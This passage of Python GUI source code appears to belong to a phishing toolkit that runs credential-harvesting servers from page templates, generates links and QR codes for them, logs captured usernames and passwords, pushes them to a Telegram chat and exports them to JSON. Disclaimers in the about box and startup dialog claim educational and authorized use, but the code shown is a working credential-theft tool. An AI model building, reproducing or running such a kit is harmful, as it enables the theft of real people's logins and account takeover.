        success = self.telegram_manager.send_message(test_msg)
        
        if success:
            self.telegram_status.setText("Status: ✅ Connected and working")
            QMessageBox.information(self, "Success", "Telegram connection test successful!")
            self.save_telegram_settings()
        else:
            self.telegram_status.setText("Status: ❌ Connection failed")
            QMessageBox.warning(self, "Error", "Failed to send test message. Check your token and chat ID.")
    
    def save_telegram_settings(self):
        self.settings.setValue("telegram/token", self.telegram_token_input.text())
        self.settings.setValue("telegram/chat_id", self.telegram_chat_id_input.text())
    
    def load_settings(self):
        token = self.settings.value("telegram/token", "")
        chat_id = self.settings.value("telegram/chat_id", "")
        
        self.telegram_token_input.setText(token)
        self.telegram_chat_id_input.setText(chat_id)
        
        if token and chat_id:
            self.telegram_manager.configure(token, chat_id)
            self.telegram_status.setText("Status: ✅ Configured")
    
    def start_server(self):
        port = self.port_input.value()
        template = self.template_editor.toPlainText()
        redirect_url = self.redirect_input.text()
        capture_all = self.capture_all_check.isChecked()
        
        if not template:
            QMessageBox.warning(self, "Error", "Template cannot be empty")
            return
        
        try:
            # Stop existing server if running
            if str(port) in self.phishing_servers:
                server = self.phishing_servers[str(port)]
                if server.running:
                    server.stop()
                    server.wait()
            
            # Start new server
            server = PhishingServer(port, template, redirect_url, capture_all, self.telegram_manager)
            server.new_credentials.connect(self.handle_new_credentials)
            server.server_status.connect(self.handle_server_status)
            server.telegram_status.connect(self.handle_telegram_status)
            server.visitor_connected.connect(self.handle_visitor)
            server.start()
            
            self.phishing_servers[str(port)] = server
            self.start_button.setEnabled(False)
            self.stop_button.setEnabled(True)
            
            phishing_link = f"http://localhost:{port}"
            self.terminal_output.appendPlainText(f"🎯 Main phishing server started: {phishing_link}")
            self.status_bar.showMessage(f"Main server running on port {port}")
            
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Could not start server: {str(e)}")
    
    def stop_server(self):
        port = self.port_input.value()
        if str(port) in self.phishing_servers:
            server = self.phishing_servers[str(port)]
            server.stop()
            server.wait()
            self.start_button.setEnabled(True)
            self.stop_button.setEnabled(False)
            self.terminal_output.appendPlainText("🛑 Main server stopped")
            self.status_bar.showMessage("Main server stopped")
    
    def generate_phishing_page(self):
        template_name = self.page_template.currentText()
        redirect_url = self.page_redirect.text()
        port = self.page_port.value()
        
        # Generate unique page ID
        page_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        
        # Get template
        if template_name in self.templates:
            template = self.templates[template_name]
        else:
            template = self.templates["Custom"]
        
        # Start dedicated server for this page
        try:
            server = PhishingServer(port, template, redirect_url, True, self.telegram_manager, page_id)
            server.new_credentials.connect(self.handle_new_credentials)
            server.server_status.connect(self.handle_server_status)
            server.telegram_status.connect(self.handle_telegram_status)
            server.visitor_connected.connect(self.handle_visitor)
            server.start()
            
            self.phishing_servers[page_id] = server
            
            # Store page info
            page_info = {
                'id': page_id,
                'template': template_name,
                'redirect_url': redirect_url,
                'port': port,
                'url': f"http://localhost:{port}",
                'created_at': datetime.now().isoformat()
            }
            self.phishing_pages[page_id] = page_info
            
            # Update UI
            self.pages_list.addItem(f"{template_name} - http://localhost:{port}")
            self.stats['pages_created'] += 1
            self.update_stats()
            
            self.terminal_output.appendPlainText(f"📄 Generated phishing page: {page_info['url']} (ID: {page_id})")
            
            # Show QR code
            self.show_qr_code(page_info['url'])
            
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Could not generate phishing page: {str(e)}")
    
    def show_qr_code(self, url):
        dialog = QRCodeDialog(url, self)
        dialog.exec_()
    
    def view_qr_code(self):
        current_item = self.pages_list.currentItem()
        if current_item:
            # Extract URL from list item text
            url = current_item.text().split(" - ")[1]
            self.show_qr_code(url)
        else:
            QMessageBox.warning(self, "Error", "Please select a phishing page first")
    
    def open_phishing_page(self):
        current_item = self.pages_list.currentItem()
        if current_item:
            url = current_item.text().split(" - ")[1]
            webbrowser.open(url)
        else:
            QMessageBox.warning(self, "Error", "Please select a phishing page first")
    
    def delete_phishing_page(self):
        current_item = self.pages_list.currentItem()
        if current_item:
            row = self.pages_list.currentRow()
            page_id = list(self.phishing_pages.keys())[row]
            
            # Stop server
            if page_id in self.phishing_servers:
                server = self.phishing_servers[page_id]
                if server.running:
                    server.stop()
                    server.wait()
                del self.phishing_servers[page_id]
            
            # Remove page
            del self.phishing_pages[page_id]
            self.pages_list.takeItem(row)
            
            self.terminal_output.appendPlainText(f"🗑️ Deleted phishing page: {page_id}")
        else:
            QMessageBox.warning(self, "Error", "Please select a phishing page first")
    
    def on_page_selected(self, item):
        pass  # Can be implemented for detailed view
    
    def handle_new_credentials(self, log_entry, cred_data):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cred_data['timestamp'] = timestamp
        self.captured_credentials.append(cred_data)
        
        self.creds_display.appendPlainText(log_entry)
        self.stats['credentials_captured'] += 1
        self.update_stats()
        
        self.status_bar.showMessage(f"New credentials captured! Total: {self.stats['credentials_captured']}")
    
    def handle_server_status(self, status):
        self.terminal_output.appendPlainText(f"📡 {status}")
    
    def handle_telegram_status(self, success, message):
        if success:
            self.terminal_output.appendPlainText(f"📱 ✅ {message}")
            self.stats['telegram_notifications'] += 1
            self.update_stats()
        else:
            self.terminal_output.appendPlainText(f"📱 ❌ {message}")
    
    def handle_visitor(self, client_info):
        self.terminal_output.appendPlainText(f"👤 {client_info}")
        self.stats['visitors'] += 1
        self.update_stats()
    
    def update_stats(self):
        self.pages_count_label.setText(f"Phishing Pages: {self.stats['pages_created']}")
        self.creds_count_label.setText(f"Credentials Captured: {self.stats['credentials_captured']}")
        self.telegram_count_label.setText(f"Telegram Notifications: {self.stats['telegram_notifications']}")
        self.visitors_count_label.setText(f"Visitors: {self.stats['visitors']}")
    
    def clear_credentials(self):
        self.captured_credentials.clear()
        self.creds_display.clear()
        self.stats['credentials_captured'] = 0
        self.update_stats()
    
    def export_credentials(self):
        if not self.captured_credentials:
            QMessageBox.information(self, "Export", "No credentials to export")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(self, "Export Credentials", "credentials.json", "JSON Files (*.json)")
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as file:
                    json.dump(self.captured_credentials, file, indent=2)
                QMessageBox.information(self, "Success", "Credentials exported successfully!")
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Could not export credentials: {str(e)}")
    
    def export_data(self):
        data = {
            'stats': self.stats,
            'phishing_pages': self.phishing_pages,
            'credentials': self.captured_credentials,
            'exported_at': datetime.now().isoformat()
        }
        
        file_path, _ = QFileDialog.getSaveFileName(self, "Export All Data", "phishing_data.json", "JSON Files (*.json)")
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as file:
                    json.dump(data, file, indent=2)
                QMessageBox.information(self, "Success", "All data exported successfully!")
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Could not export data: {str(e)}")
    
    def clear_data(self):
        reply = QMessageBox.question(self, "Confirm Clear", 
                                   "Are you sure you want to clear all data? This cannot be undone.",
                                   QMessageBox.Yes | QMessageBox.No)
        
        if reply == QMessageBox.Yes:
            self.captured_credentials.clear()
            self.phishing_pages.clear()
            self.stats = {'pages_created': 0, 'credentials_captured': 0, 'telegram_notifications': 0, 'visitors': 0}
            
            # Stop all servers
            for server in self.phishing_servers.values():
                if server.running:
                    server.stop()
                    server.wait()
            self.phishing_servers.clear()
            
            # Clear UI
            self.creds_display.clear()
            self.terminal_output.clear()
            self.pages_list.clear()
            self.update_stats()
            
            self.terminal_output.appendPlainText("🗑️ All data cleared")
    
    def show_credentials_viewer(self):
        if not self.captured_credentials:
            QMessageBox.information(self, "Credentials", "No credentials captured yet")
            return
        
        viewer = CredentialsViewer(self.captured_credentials, self)
        viewer.exec_()
    
    def show_settings(self):
        dialog = SettingsDialog(self)
        if dialog.exec_() == QDialog.Accepted:
            dialog.save_settings()
            self.load_settings()
    
    def show_about(self):
        QMessageBox.about(self, "About Accurate Cyber Defense Phishing Tool",
            "<h3>Accurate Cyber Defense - Advanced Phishing Awareness Tool</h3>"
            "<p><b>Version:</b> 3.0</p>"
            "<p><b>Purpose:</b> Educational and authorized security awareness training only</p>"
            "<p><b>Features:</b></p>"
            "<ul>"
            "<li>Multiple phishing page templates</li>"
            "<li>Real-time credentials capture and monitoring</li>"
            "<li>Telegram notifications</li>"
            "<li>QR code generation for mobile testing</li>"
            "<li>Advanced statistics and reporting</li>"
            "<li>Comprehensive data export</li>"
            "</ul>"
            "<p><b>⚠️ Warning:</b> This tool should only be used for educational purposes and authorized penetration testing. "
            "Unauthorized use is illegal and unethical.</p>"
            "<p><b>🔒 Use Responsibly:</b> Always obtain proper authorization before testing.</p>")
    
    def closeEvent(self, event):
        # Stop all servers
        for server in self.phishing_servers.values():
            if server.running:
                server.stop()
                server.wait()
        event.accept()

def main():
    app = QApplication(sys.argv)
    
    # Set application properties
    app.setApplicationName("Accurate Cyber Defense Phishing Tool")
    app.setApplicationVersion("3.0")
    app.setOrganizationName("Accurate Cyber Defense")
    
    # Display educational disclaimer
    reply = QMessageBox.question(None, "⚠️ EDUCATIONAL USE ONLY ⚠️", 
        "ACCURATE CYBER DEFENSE - PHISHING AWARENESS TOOL\n\n"
        "This tool is designed for:\n"
        "• Security education and awareness training\n"
        "• Authorized penetration testing\n"
        "• Cybersecurity research and development\n\n"
        "⚠️ LEGAL AND ETHICAL USE ONLY ⚠️\n"
        "• Never use without explicit authorization\n"
        "• Respect privacy and applicable laws\n"
        "• Use only on systems you own or have permission to test\n\n"
        "By clicking 'Yes', you confirm you have proper authorization\n"
        "and understand the legal and ethical implications.",
        QMessageBox.Yes | QMessageBox.No,
        QMessageBox.No)
    
    if reply != QMessageBox.Yes:
        sys.exit(0)
    
    # Create and show main window
    window = AdvancedPhishingTool()
    window.show()
    
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()